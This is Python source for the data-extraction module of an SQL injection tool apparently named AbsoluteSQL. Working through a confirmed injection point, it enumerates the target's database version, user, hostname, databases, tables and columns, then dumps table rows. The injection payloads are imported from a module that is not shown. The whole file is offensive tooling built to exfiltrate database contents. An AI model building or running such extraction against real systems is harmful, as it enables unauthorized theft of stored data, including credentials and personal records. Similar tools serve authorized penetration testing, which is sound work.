"""
AbsoluteSQL — Extractor
High-level DB enumeration: databases → tables → columns → rows.
Sits on top of Injector and issues the right DBMS-specific queries.
"""

from dataclasses import dataclass, field
from typing import Optional, List, Dict

from .payloads import EXTRACTION_QUERIES
from .config import DBMS_MYSQL
from .injector import Injector
from .scanner import Vulnerability
from .utils import log, truncate


@dataclass
class DBInfo:
    name:      str
    tables:    List["TableInfo"] = field(default_factory=list)

@dataclass
class TableInfo:
    name:    str
    db:      str
    columns: List[str]               = field(default_factory=list)
    rows:    List[Dict[str, str]]    = field(default_factory=list)
    row_count: Optional[int]         = None

@dataclass
class ExtractionResult:
    dbms:       str
    version:    Optional[str]             = None
    current_db: Optional[str]             = None
    current_user: Optional[str]           = None
    hostname:   Optional[str]             = None
    databases:  List[DBInfo]              = field(default_factory=list)
    error:      Optional[str]             = None


class DataExtractor:
    """
    Orchestrates full database extraction using a confirmed Injector.
    """

    def __init__(self, injector: Injector, dbms: str) -> None:
        self.inj    = injector
        self.dbms   = dbms
        self.queries = EXTRACTION_QUERIES.get(dbms, EXTRACTION_QUERIES.get(DBMS_MYSQL, {}))

    # ── Meta info ─────────────────────────────────────────────────────────────
    def get_version(self) -> Optional[str]:
        q = self.queries.get("version")
        if not q:
            return None
        return self._extract_scalar(q)

    def get_current_user(self) -> Optional[str]:
        q = self.queries.get("user")
        if not q:
            return None
        return self._extract_scalar(q)

    def get_current_db(self) -> Optional[str]:
        q = self.queries.get("database")
        if not q:
            return None
        return self._extract_scalar(q)

    def get_hostname(self) -> Optional[str]:
        q = self.queries.get("hostname")
        if not q:
            return None
        return self._extract_scalar(q)

    # ── Enumeration ───────────────────────────────────────────────────────────
    def get_databases(self) -> List[str]:
        q = self.queries.get("databases")
        if not q:
            return []
        result = self.inj.extract_list(q, limit=100)
        log.info(f"Found {len(result)} database(s): {result}")
        return result

    def get_tables(self, db: str) -> List[str]:
        q = self.queries.get("tables", "")
        if not q:
            q = self.queries.get("tables_current", "")
        if not q:
            return []
        q = q.replace("{db}", db)
        result = self.inj.extract_list(q, limit=200)
        log.info(f"Found {len(result)} table(s) in {db!r}: {result}")
        return result

    def get_columns(self, db: str, table: str) -> List[str]:
        q = self.queries.get("columns", "")
        if not q:
            return []
        q = q.replace("{db}", db).replace("{table}", table)
        result = self.inj.extract_list(q, limit=100)
        log.info(f"Found {len(result)} column(s) in {db}.{table}: {result}")
        return result

    def get_row_count(self, db: str, table: str) -> Optional[int]:
        q = self.queries.get("row_count", "")
        if not q:
            return None
        q = q.replace("{db}", db).replace("{table}", table)
        val = self._extract_scalar(q)
        try:
            return int(val) if val else None
        except (ValueError, TypeError):
            return None

    def dump_table(
        self,
        db:      str,
        table:   str,
        columns: List[str],
        limit:   int = 100,
        offset:  int = 0,
    ) -> List[Dict[str, str]]:
        """
        Dump rows from a table. Returns list of {col: value} dicts.
        """
        if not columns:
            return []

        q = self.queries.get("data", "")
        if not q:
            return []

        # Build column expression
        col_expr = ", ".join(columns)
        q = (q
             .replace("{cols}", col_expr)
             .replace("{db}", db)
             .replace("{table}", table)
             .replace("{limit}", str(limit))
             .replace("{offset}", str(offset)))

        raw_rows = self.inj.extract_list(q, limit=limit)
        rows = []
        for raw in raw_rows:
            # Rows may come back as "val1||val2||val3"
            parts = raw.split("||") if "||" in raw else [raw]
            row = {}
            for i, col in enumerate(columns):
                row[col] = parts[i].strip() if i < len(parts) else ""
            rows.append(row)

        log.info(f"Dumped {len(rows)} rows from {db}.{table}")
        return rows

    # ── Full extraction pipeline ───────────────────────────────────────────────
    def run(
        self,
        target_dbs:    Optional[List[str]] = None,
        target_tables: Optional[List[str]] = None,
        dump_rows:     bool                = True,
        row_limit:     int                 = 50,
    ) -> ExtractionResult:
        """
        Full extraction: version → user → databases → tables → columns → rows.

        target_dbs:    if set, only extract these databases
        target_tables: if set, only extract these tables (across all dbs)
        dump_rows:     whether to dump table contents
        row_limit:     max rows to dump per table
        """
        result = ExtractionResult(dbms=self.dbms)

        result.version      = self.get_version()
        result.current_user = self.get_current_user()
        result.current_db   = self.get_current_db()
        result.hostname     = self.get_hostname()

        log.info(f"Version: {result.version}")
        log.info(f"User:    {result.current_user}")
        log.info(f"DB:      {result.current_db}")

        db_names = self.get_databases()
        if not db_names and result.current_db:
            db_names = [result.current_db]

        if target_dbs:
            db_names = [d for d in db_names if d in target_dbs]

        for db_name in db_names:
            db_info = DBInfo(name=db_name)

            table_names = self.get_tables(db_name)
            if target_tables:
                table_names = [t for t in table_names if t in target_tables]

            for tbl_name in table_names:
                columns = self.get_columns(db_name, tbl_name)
                tbl_info = TableInfo(
                    name=tbl_name,
                    db=db_name,
                    columns=columns,
                )
                tbl_info.row_count = self.get_row_count(db_name, tbl_name)

                if dump_rows and columns:
                    tbl_info.rows = self.dump_table(
                        db_name, tbl_name, columns, limit=row_limit
                    )

                db_info.tables.append(tbl_info)

            result.databases.append(db_info)

        return result

    # ── Private ───────────────────────────────────────────────────────────────
    def _extract_scalar(self, query: str) -> Optional[str]:
        """Run a query expected to return one value."""
        return self.inj.extract(query)

